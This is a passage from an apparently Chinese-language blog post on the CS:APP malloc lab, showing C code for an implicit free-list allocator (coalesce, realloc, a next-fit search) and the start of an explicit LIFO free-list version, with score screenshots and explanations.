<span class="token class-name">size_t</span> size <span class="token operator">=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">coalesce</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">coalesce</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> prev_alloc<span class="token operator">=</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> next_alloc<span class="token operator">=</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> size <span class="token operator">=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>prev_alloc <span class="token operator">&amp;&amp;</span> next_alloc<span class="token punctuation">)</span>    <span class="token keyword">return</span> bp<span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>prev_alloc <span class="token operator">==</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span>next_alloc<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//后面的块是空闲块，则指针不变，合并后面的块</span>        size<span class="token operator">+=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span>                <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>next_alloc<span class="token operator">==</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> prev_alloc<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//前面的块空闲</span>        size<span class="token operator">+=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bp<span class="token operator">=</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        size<span class="token operator">+=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        size<span class="token operator">+=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bp<span class="token operator">=</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> bp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* * mm_realloc - Implemented simply in terms of mm_malloc and mm_free */</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_realloc</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>oldptr<span class="token operator">=</span>ptr<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>newptr<span class="token punctuation">;</span>    <span class="token class-name">size_t</span> new_size<span class="token punctuation">,</span>old_size<span class="token punctuation">,</span>extend_size<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>ptr<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token function">mm_malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>size<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">mm_free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    new_size<span class="token operator">=</span><span class="token function">ALIGN</span><span class="token punctuation">(</span>size<span class="token operator">+</span>DSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    old_size<span class="token operator">=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>old_size<span class="token operator">>=</span>new_size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//只需要在原有空间上释放后面的一部分空间就可以了，其实可以直接用place语句替换ifelse</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>old_size<span class="token operator">-</span>new_size<span class="token operator">>=</span>MINBLOCK<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">place</span><span class="token punctuation">(</span>oldptr<span class="token punctuation">,</span>new_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> oldptr<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> oldptr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//太小了，只能释放内存，重新找一块新的</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>newptr<span class="token operator">=</span><span class="token function">find_fit</span><span class="token punctuation">(</span>new_size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        extend_size<span class="token operator">=</span><span class="token function">MAX</span><span class="token punctuation">(</span>new_size<span class="token punctuation">,</span>CHUNKSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>newptr<span class="token operator">=</span><span class="token function">extend_heap</span><span class="token punctuation">(</span>extend_size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">place</span><span class="token punctuation">(</span>newptr<span class="token punctuation">,</span>new_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>newptr<span class="token punctuation">,</span>oldptr<span class="token punctuation">,</span>old_size<span class="token operator">-</span><span class="token number">2</span><span class="token operator">*</span>WSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">mm_free</span><span class="token punctuation">(</span>oldptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> newptr<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得分如下：</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202407110613115.png" alt="image-20240711060851381"></p><h3 id="2-2优化next-fit"><a href="#2-2优化next-fit" class="headerlink" title="2.2优化next fit"></a>2.2优化next fit</h3><p>首次适配：</p><p>优点：趋向于将大的空闲块保留在链表的后面<br>缺点：趋向于在靠近链表起始处留下小空闲块的“碎片”，增加了对较大块的搜索时间。<br>下一次适配：</p><p>优点：上一次在某个空闲块中发现匹配，下一次也有可能（倾向于）在这个剩余块中发现匹配。<br>缺点：研究表明，下一次适配的内存利用率要比首次适配低得多。<br>针对得到的两次分数，可以明显的看到下一次适配的吞吐率比首次适配高很多，这方面next fit优势明显，但内存利用率要低。</p><p>优化方向：</p><p>first–&gt; next fit(即从上一次匹配的地方先寻找)</p><p>修改find_fit函数和colaesce函数即可</p><p>修改colaesce函数是为了防止出现下一次找上一次的指针不存在这种情况。所以会在<code>colaesce</code>函数中更新<code>next——fitp</code>.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span>next_fitp<span class="token punctuation">;</span><span class="token comment">//静态变量，在int中赋初值</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span> <span class="token function">find_fit</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">char</span> <span class="token operator">*</span>lastp<span class="token punctuation">;</span>   next_fitp<span class="token operator">=</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>next_fitp<span class="token punctuation">)</span><span class="token punctuation">;</span>   lastp<span class="token operator">=</span>next_fitp<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>next_fitp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> next_fitp <span class="token operator">=</span> <span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>next_fitp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>next_fitp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>next_fitp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>=</span> size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> next_fitp<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    next_fitp <span class="token operator">=</span> <span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>heap_listp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span>next_fitp <span class="token operator">!=</span> lastp<span class="token punctuation">;</span> next_fitp <span class="token operator">=</span> <span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>next_fitp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>next_fitp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>next_fitp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>=</span> size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> next_fitp<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">coalesce</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> prev_alloc<span class="token operator">=</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> next_alloc<span class="token operator">=</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> size <span class="token operator">=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>prev_alloc <span class="token operator">&amp;&amp;</span> next_alloc<span class="token punctuation">)</span>    <span class="token keyword">return</span> bp<span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>prev_alloc <span class="token operator">==</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span>next_alloc<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//后面的块是空闲块，则指针不变，合并后面的块</span>        size<span class="token operator">+=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>next_alloc<span class="token operator">==</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> prev_alloc<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//前面的块空闲</span>        size<span class="token operator">+=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>bp<span class="token operator">==</span>next_fitp<span class="token punctuation">)</span>        next_fitp<span class="token operator">=</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        bp<span class="token operator">=</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        size<span class="token operator">+=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        size<span class="token operator">+=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span>bp<span class="token operator">==</span>next_fitp<span class="token punctuation">)</span>        next_fitp<span class="token operator">=</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        bp<span class="token operator">=</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> bp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>优化得分为：</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202407110613160.png" alt="image-20240711033445368"></p><h3 id="3-1显式空闲列表-LIFO"><a href="#3-1显式空闲列表-LIFO" class="headerlink" title="3.1显式空闲列表+LIFO"></a>3.1显式空闲列表+LIFO</h3><p>一种方法是用后进先出 (LIFO) 的顺序维护链表， 将新释放的块放置在链表的开始处。 使用<code>LIFO</code>的顺序和首次适配的放置策略,分配器会最先检查最近使用过的块。在这种情况下，释放一个块可以在常数时间内完成。如果使用了边界标记，那么合并也可以在常数时间内完成。</p><p>另一种方法是按照地址顺序来维护链表，其中链表中每个块的地址都小于它后继的地址。在这种情况下，释放一个块需要线性时间的搜索来定位合适的前驱。 平衡点在于，按照地址排序的首次适配比 按 LIFO 排序的首次适配有更高的内存利用率，接近最佳适配的利用率。 一般而言，显式链表的缺点是空闲块必须足够大，以包含所有需要的指针，以及头部和可能的脚部。这就导致了更大的最小块大小,也潜在地提高了内部碎片的程度。</p><p>仅仅需要在隐式空闲列表的基础上添加一个freelist，即添加前驱和后驱，可以套用双向链表的知识模拟malloc。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* * mm-naive.c - The fastest, least memory-efficient malloc package. *  * In this naive approach, a block is allocated by simply incrementing * the brk pointer.  A block is pure payload. There are no headers or * footers.  Blocks are never coalesced or reused. Realloc is * implemented directly using mm_malloc and mm_free. * * NOTE TO STUDENTS: Replace this header comment with your own header * comment that gives a high level description of your solution. */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"mm.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"memlib.h"</span></span><span class="token comment">/********************************************************* * NOTE TO STUDENTS: Before you do anything else, please * provide your team information in the following struct. ********************************************************/</span><span class="token class-name">team_t</span> team <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/* Team name */</span>    <span class="token string">"Vite Fuck"</span><span class="token punctuation">,</span>    <span class="token comment">/* First member's full name */</span>    <span class="token string">"zhz_vite"</span><span class="token punctuation">,</span>    <span class="token comment">/* First member's email address */</span>    <span class="token string">"2811215248@qq.com"</span><span class="token punctuation">,</span>    <span class="token comment">/* Second member's full name (leave blank if none) */</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token comment">/* Second member's email address (leave blank if none) */</span>    <span class="token string">""</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/* single word (4) or double word (8) alignment */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ALIGNMENT</span> <span class="token expression"><span class="token number">8</span></span></span><span class="token comment">/* rounds up to the nearest multiple of ALIGNMENT */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">ALIGN</span><span class="token expression"><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>ALIGNMENT<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0x7</span><span class="token punctuation">)</span></span><span class="token comment">//会得到大于等于size的最小整数</span></span><span class="token comment">//(size) + (ALIGNMENT-1)会得到最接近但不大于其alignment的倍数</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SIZE_T_SIZE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token function">ALIGN</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token comment">/* $begin mallocmacros */</span><span class="token comment">/* Basic constants and macros */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">WSIZE</span>       <span class="token expression"><span class="token number">4</span>       </span><span class="token comment">/* Word and header/footer size (bytes) */</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DSIZE</span>       <span class="token expression"><span class="token number">8</span>       </span><span class="token comment">/* Double word size (bytes) */</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CHUNKSIZE</span>  <span class="token expression"><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">12</span><span class="token punctuation">)</span>  </span><span class="token comment">/* Extend heap by this amount (bytes) */</span>  </span> <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">MAX</span><span class="token expression"><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token operator">?</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>  </span></span> <span class="token comment">/* Pack a size and allocated bit into a word */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PACK</span><span class="token expression"><span class="token punctuation">(</span>size<span class="token punctuation">,</span> alloc<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>alloc<span class="token punctuation">)</span><span class="token punctuation">)</span> </span><span class="token comment">//打包头部的值，再用PUT（p,PACK(size,alloc)),之类的函数把他丢进header/footer</span></span> <span class="token comment">/* Read and write a word at address p */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GET</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span>       <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> </span><span class="token comment">//获得p指向的值           </span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PUT</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">,</span> val<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span>    </span><span class="token comment">//写入val与p指向地址</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GETADDR</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span>         <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> 